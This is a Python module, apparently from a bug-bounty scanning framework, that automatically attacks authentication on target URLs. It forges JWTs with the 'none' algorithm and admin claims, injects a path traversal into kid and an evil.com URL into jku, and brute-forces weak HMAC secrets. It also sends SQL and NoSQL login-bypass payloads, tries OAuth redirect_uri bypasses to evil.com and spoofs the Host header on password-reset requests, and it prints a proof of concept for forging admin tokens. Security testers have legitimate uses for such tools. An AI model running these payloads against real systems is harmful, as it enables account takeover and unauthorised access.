"""
Specialized Auth Hunter
Authentication bypass, JWT attacks, OAuth flaws, session management
"""

import asyncio
import json
import base64
import hmac
import hashlib
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

from core.config_manager import get_config
from hunting.scanner_orchestrator import VulnerabilityFinding, ScanTarget, ScannerType


class AuthHunter:
    """Specialized authentication vulnerability hunting module"""

    def __init__(self, config_manager):
        self.config = config_manager
        self.findings: List[VulnerabilityFinding] = []

        # JWT algorithm confusion payloads
        self.jwt_payloads = {
            "none_algorithm": {
                "header": {"alg": "none", "typ": "JWT"},
                "payload": {"sub": "admin", "role": "admin"},
            },
            "hs256_as_rs256": {
                "header": {"alg": "HS256", "typ": "JWT"},
                "payload": {"sub": "admin", "role": "admin"},
            },
            "kid_injection": {
                "header": {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../etc/passwd"},
                "payload": {"sub": "admin"},
            },
            "jku_injection": {
                "header": {"alg": "RS256", "typ": "JWT", "jku": "http://evil.com/jwks.json"},
                "payload": {"sub": "admin"},
            },
        }

        # Authentication bypass payloads
        self.auth_bypass_payloads = {
            "sql_injection": [
                "' OR '1'='1' --",
                '" OR "1"="1" --',
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' UNION SELECT 1, 'admin', 'admin' --",
            ],
            "no_sql_injection": [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$regex": ".*"}',
                '{"$where": "1==1"}',
            ],
            "header_injection": [
                "admin\r\nX-Custom-Header: value",
                "admin\nX-Custom-Header: value",
            ],
        }

    async def hunt(self, targets: List[ScanTarget]) -> List[VulnerabilityFinding]:
        """Hunt for authentication vulnerabilities"""
        for target in targets[:50]:
            await self._test_jwt_vulnerabilities(target)
            await self._test_auth_bypass(target)
            await self._test_session_management(target)
            await self._test_oauth_flaws(target)
            await self._test_password_reset(target)

        return self.findings

    async def _test_jwt_vulnerabilities(self, target: ScanTarget):
        """Test JWT vulnerabilities"""
        # Check for JWT in Authorization header
        auth_header = target.parameters.get("Authorization", "") or target.parameters.get("authorization", "")
        if not auth_header.startswith("Bearer "):
            # Check cookies
            for key, value in target.parameters.items():
                if "jwt" in key.lower() or "token" in key.lower():
                    auth_header = f"Bearer {value}"
                    break

        if not auth_header.startswith("Bearer "):
            return

        token = auth_header[7:]  # Remove "Bearer "

        # Test algorithm confusion
        await self._test_jwt_none_algorithm(target, token)
        await self._test_jwt_algorithm_confusion(target, token)
        await self._test_jwt_kid_injection(target, token)
        await self._test_jwt_jku_injection(target, token)
        await self._test_jwt_weak_secret(target, token)

    async def _test_jwt_none_algorithm(self, target: ScanTarget, token: str):
        """Test JWT 'none' algorithm"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return

            # Decode payload
            payload = self._decode_jwt_part(parts[1])
            if not payload:
                return

            # Modify payload for admin
            payload['role'] = 'admin'
            payload['sub'] = 'admin'

            # Create none algorithm token
            header = {"alg": "none", "typ": "JWT"}
            new_header = self._encode_jwt_part(header)
            new_payload = self._encode_jwt_part(payload)
            new_token = f"{new_header}.{new_payload}."

            # Test the token
            await self._test_jwt_token(target, new_token, "none_algorithm")
        except Exception:
            pass

    async def _test_jwt_algorithm_confusion(self, target: ScanTarget, token: str):
        """Test JWT algorithm confusion (RS256 -> HS256)"""
        # This would need the public key to sign with HS256
        # For now, skip - would be implemented with key extraction
        pass

    async def _test_jwt_kid_injection(self, target: ScanTarget, token: str):
        """Test JWT KID (Key ID) injection"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return

            header = self._decode_jwt_part(parts[0])
            if not header:
                return

            # Inject path traversal in KID
            header['kid'] = "../../../../../../etc/passwd"
            payload = self._decode_jwt_part(parts[1])

            new_header = self._encode_jwt_part(header)
            new_payload = self._encode_jwt_part(payload)
            new_token = f"{new_header}.{new_payload}."

            await self._test_jwt_token(target, new_token, "kid_injection")
        except Exception:
            pass

    async def _test_jwt_jku_injection(self, target: ScanTarget, token: str):
        """Test JWT JKU (JWK Set URL) injection"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return

            header = self._decode_jwt_part(parts[0])
            if not header:
                return

            # Inject JKU
            header['jku'] = "http://interactsh-url/jwks.json"
            payload = self._decode_jwt_part(parts[1])

            new_header = self._encode_jwt_part(header)
            new_payload = self._encode_jwt_part(payload)
            new_token = f"{new_header}.{new_payload}."

            await self._test_jwt_token(target, new_token, "jku_injection")
        except Exception:
            pass

    async def _test_jwt_weak_secret(self, target: ScanTarget, token: str):
        """Test JWT weak secret brute force"""
        # Common weak secrets
        weak_secrets = [
            "secret", "secretkey", "jwtsecret", "mysecret",
            "password", "123456", "changeme", "admin",
            "jwt", "token", "key", "secret123",
        ]

        parts = token.split('.')
        if len(parts) != 3:
            return

        signing_input = f"{parts[0]}.{parts[1]}"
        original_signature = parts[2]

        for secret in weak_secrets:
            # Try HS256
            expected_sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
            ).decode().rstrip('=')

            if expected_sig == original_signature:
                finding = VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="auth_bypass",
                    severity="P1",
                    title="JWT Weak Secret",
                    description=f"JWT token signed with weak secret: '{secret}'. Allows token forgery.",
                    target=target,
                    evidence={
                        "technique": "weak_secret",
                        "secret": secret,
                        "algorithm": "HS256",
                    },
                    poc=self._generate_jwt_poc(secret, "HS256"),
                    confidence=1.0,
                    tags=["jwt", "weak-secret", "auth-bypass"],
                )
                self.findings.append(finding)
                return

    async def _test_jwt_token(self, target: ScanTarget, token: str, technique: str):
        """Test a modified JWT token"""
        import httpx

        headers = {"Authorization": f"Bearer {token}"}

        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                if target.method == "GET":
                    response = await client.get(target.url, headers=headers)
                else:
                    response = await client.post(target.url, headers=headers, data=target.parameters)

            # Check if token was accepted
            if response.status_code in [200, 201, 204]:
                finding = VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="auth_bypass",
                    severity="P1",
                    title=f"JWT {technique.replace('_', ' ').title()}",
                    description=f"JWT {technique} vulnerability allows authentication bypass. Modified token accepted.",
                    target=target,
                    evidence={
                        "technique": technique,
                        "token": token[:50] + "...",
                        "status_code": response.status_code,
                    },
                    poc="",
                    confidence=0.9,
                    tags=["jwt", technique, "auth-bypass"],
                )
                self.findings.append(finding)
        except Exception:
            pass

    async def _test_auth_bypass(self, target: ScanTarget):
        """Test authentication bypass"""
        # Test SQL injection in login
        if self._is_login_endpoint(target):
            await self._test_login_sql_injection(target)

        # Test NoSQL injection
        await self._test_login_nosql_injection(target)

    def _is_login_endpoint(self, target: ScanTarget) -> bool:
        """Check if endpoint is a login page"""
        url_lower = target.url.lower()
        return any(x in url_lower for x in ['login', 'signin', 'auth', 'sign-in'])

    async def _test_login_sql_injection(self, target: ScanTarget):
        """Test SQL injection in login form"""
        for payload in self.auth_bypass_payloads["sql_injection"]:
            test_params = {
                "username": payload,
                "password": payload,
                "email": payload,
            }

            # Find username/password parameters
            for param_name in target.parameters.keys():
                if any(x in param_name.lower() for x in ['user', 'email', 'login', 'name']):
                    test_params[param_name] = payload
                elif any(x in param_name.lower() for x in ['pass', 'pwd', 'secret']):
                    test_params[param_name] = payload

            result = await self._send_login_request(target, test_params)
            if result and self._is_login_success(result):
                finding = VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="auth_bypass",
                    severity="P1",
                    title="SQL Injection in Login Form",
                    description=f"SQL injection in login form allows authentication bypass. Payload: {payload}",
                    target=target,
                    evidence={
                        "technique": "sql_injection",
                        "payload": payload,
                        "parameters": test_params,
                    },
                    poc="",
                    confidence=0.9,
                    tags=["auth-bypass", "sqli", "login"],
                )
                self.findings.append(finding)
                return

    async def _test_login_nosql_injection(self, target: ScanTarget):
        """Test NoSQL injection in login"""
        for payload in self.auth_bypass_payloads["no_sql_injection"]:
            test_params = {
                "username": {"$ne": ""},
                "password": {"$ne": ""},
            }

            result = await self._send_login_request(target, test_params, json=True)
            if result and self._is_login_success(result):
                finding = VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="auth_bypass",
                    severity="P1",
                    title="NoSQL Injection in Login Form",
                    description=f"NoSQL injection in login form allows authentication bypass.",
                    target=target,
                    evidence={
                        "technique": "nosql_injection",
                        "payload": json.dumps(payload),
                    },
                    poc="",
                    confidence=0.85,
                    tags=["auth-bypass", "nosql", "login"],
                )
                self.findings.append(finding)
                return

    async def _send_login_request(self, target: ScanTarget, params: Dict, json: bool = False):
        """Send login request"""
        import httpx

        try:
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
                if json:
                    response = await client.post(target.url, json=params)
                else:
                    response = await client.post(target.url, data=params)
            return response
        except Exception:
            return None

    def _is_login_success(self, response) -> bool:
        """Check if login was successful"""
        # Check for redirect to dashboard/home
        if response.status_code in [301, 302, 303]:
            location = response.headers.get('location', '').lower()
            if any(x in location for x in ['dashboard', 'home', 'admin', 'profile', 'account']):
                return True

        # Check for session cookies
        if 'session' in str(response.cookies).lower() or 'token' in str(response.cookies).lower():
            return True

        # Check response content
        success_indicators = ['welcome', 'dashboard', 'logout', 'profile', 'admin panel']
        response_lower = response.text.lower()
        if any(ind in response_lower for ind in success_indicators):
            return True

        return False

    async def _test_session_management(self, target: ScanTarget):
        """Test session management flaws"""
        # Test session fixation
        await self._test_session_fixation(target)

        # Test session prediction
        # Test concurrent sessions
        # Test session timeout

    async def _test_session_fixation(self, target: ScanTarget):
        """Test session fixation"""
        import httpx

        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                # Get initial session
                response1 = await client.get(target.url)
                session1 = response1.cookies.get('session') or response1.cookies.get('PHPSESSID') or response1.cookies.get('JSESSIONID')

                if session1:
                    # Try to use same session after login
                    login_params = {"username": "test", "password": "test"}
                    response2 = await client.post(target.url, data=login_params, cookies={'session': session1})
                    session2 = response2.cookies.get('session') or response2.cookies.get('PHPSESSID') or response2.cookies.get('JSESSIONID')

                    if session1 == session2 and self._is_login_success(response2):
                        finding = VulnerabilityFinding(
                            scanner=ScannerType.CUSTOM,
                            vuln_type="auth_bypass",
                            severity="P3",
                            title="Session Fixation",
                            description=f"Session ID not regenerated after login. Allows session fixation attacks.",
                            target=target,
                            evidence={
                                "technique": "session_fixation",
                                "session_before": session1[:20] + "...",
                                "session_after": session2[:20] + "...",
                            },
                            poc="",
                            confidence=0.8,
                            tags=["session", "fixation"],
                        )
                        self.findings.append(finding)
        except Exception:
            pass

    async def _test_oauth_flaws(self, target: ScanTarget):
        """Test OAuth/OIDC flaws"""
        # Check for OAuth endpoints
        url_lower = target.url.lower()
        if not any(x in url_lower for x in ['oauth', 'authorize', 'callback', 'connect']):
            return

        # Test redirect_uri validation
        await self._test_oauth_redirect_uri(target)

        # Test state parameter
        await self._test_oauth_state_parameter(target)

        # Test PKCE
        await self._test_oauth_pkce(target)

    async def _test_oauth_redirect_uri(self, target: ScanTarget):
        """Test OAuth redirect_uri validation"""
        import httpx
        import urllib.parse

        # Common bypasses
        bypasses = [
            "http://evil.com",
            "http://evil.com@legit.com",
            "http://legit.com.evil.com",
            "http://legit.com.evil.com/callback",
            "http://legit.com/callback@evil.com",
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
        ]

        for bypass in bypasses:
            params = {
                "client_id": "test",
                "redirect_uri": bypass,
                "response_type": "code",
                "scope": "openid profile",
            }

            try:
                async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
                    response = await client.get(target.url, params=params)

                if response.status_code in [301, 302, 303]:
                    location = response.headers.get('location', '')
                    if bypass in location or 'evil.com' in location:
                        finding = VulnerabilityFinding(
                            scanner=ScannerType.CUSTOM,
                            vuln_type="auth_bypass",
                            severity="P2",
                            title="OAuth Redirect URI Validation Bypass",
                            description=f"OAuth redirect_uri validation can be bypassed. Malicious redirect_uri accepted: {bypass}",
                            target=target,
                            evidence={
                                "technique": "redirect_uri_bypass",
                                "bypass_payload": bypass,
                                "redirect_location": location,
                            },
                            poc="",
                            confidence=0.85,
                            tags=["oauth", "redirect-uri", "auth-bypass"],
                        )
                        self.findings.append(finding)
                        return
            except Exception:
                pass

    async def _test_oauth_state_parameter(self, target: ScanTarget):
        """Test OAuth state parameter"""
        # Test missing state
        params = {
            "client_id": "test",
            "redirect_uri": "http://localhost/callback",
            "response_type": "code",
        }

        try:
            import httpx
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as client:
                response = await client.get(target.url, params=params)

            # If no state parameter required, might be vulnerable
            if response.status_code in [301, 302, 303]:
                finding = VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="auth_bypass",
                    severity="P3",
                    title="OAuth Missing State Parameter",
                    description=f"OAuth authorization endpoint does not require state parameter. Vulnerable to CSRF.",
                    target=target,
                    evidence={
                        "technique": "missing_state",
                    },
                    poc="",
                    confidence=0.6,
                    tags=["oauth", "state", "csrf"],
                )
                self.findings.append(finding)
        except Exception:
            pass

    async def _test_oauth_pkce(self, target: ScanTarget):
        """Test OAuth PKCE"""
        # Check if PKCE is enforced
        pass

    async def _test_password_reset(self, target: ScanTarget):
        """Test password reset flaws"""
        url_lower = target.url.lower()
        if not any(x in url_lower for x in ['reset', 'forgot', 'recover']):
            return

        # Test host header injection
        await self._test_host_header_injection(target)

        # Test token prediction
        # Test token reuse

    async def _test_host_header_injection(self, target: ScanTarget):
        """Test host header injection in password reset"""
        import httpx

        # Test with malicious host header
        headers = {"Host": "evil.com"}

        try:
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as client:
                response = await client.post(target.url, data={"email": "victim@example.com"}, headers=headers)

            # Check if reset link points to evil.com
            if "evil.com" in response.text:
                finding = VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="auth_bypass",
                    severity="P2",
                    title="Host Header Injection in Password Reset",
                    description=f"Password reset uses Host header for generating reset links. Allows account takeover via host header injection.",
                    target=target,
                    evidence={
                        "technique": "host_header_injection",
                        "host_header": "evil.com",
                        "reset_link_contains_evil": True,
                    },
                    poc="",
                    confidence=0.8,
                    tags=["password-reset", "host-header", "account-takeover"],
                )
                self.findings.append(finding)
        except Exception:
            pass

    def _decode_jwt_part(self, part: str) -> Optional[Dict]:
        """Decode JWT part (header or payload)"""
        try:
            # Add padding
            part += '=' * (-len(part) % 4)
            decoded = base64.urlsafe_b64decode(part)
            return json.loads(decoded)
        except Exception:
            return None

    def _encode_jwt_part(self, part: Dict) -> str:
        """Encode JWT part"""
        json_str = json.dumps(part, separators=(',', ':'))
        encoded = base64.urlsafe_b64encode(json_str.encode()).decode().rstrip('=')
        return encoded

    def _generate_jwt_poc(self, secret: str, algorithm: str) -> str:
        """Generate JWT POC"""
        return f"""# JWT Weak Secret Proof of Concept
## Vulnerability Details
- **Algorithm**: {algorithm}
- **Weak Secret**: {secret}

## Forge Admin Token (Python)
```python
import jwt
import datetime

secret = "{secret}"
payload = {{
    "sub": "admin",
    "role": "admin",
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)
}}
token = jwt.encode(payload, secret, algorithm="{algorithm}")
print(token)
```

## Test Token
```bash
curl -H "Authorization: Bearer <FORGED_TOKEN>" <TARGET_URL>
```"""


async def hunt_auth(targets: List[ScanTarget], config_manager=None) -> List[VulnerabilityFinding]:
    """Hunt for authentication vulnerabilities"""
    hunter = AuthHunter(config_manager or get_config())
    return await hunter.hunt(targets)